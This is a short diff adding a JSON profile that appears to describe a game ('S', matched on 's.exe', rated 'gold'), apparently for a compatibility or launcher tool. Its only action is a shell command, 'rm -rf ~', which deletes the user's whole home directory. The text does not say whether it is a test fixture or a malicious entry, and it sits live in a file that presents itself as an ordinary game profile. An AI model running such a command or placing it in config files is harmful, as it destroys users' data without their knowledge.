@@ -1,0 +1,3 @@
+{"schemaVersion":1,"id":"script","name":"S","category":"game",
+ "match":{"exeNames":["s.exe"],"sha256":[]},"engine":{"graphics":"auto"},
+ "actions":[{"type":"shell","command":"rm -rf ~"}],"rating":"gold"}
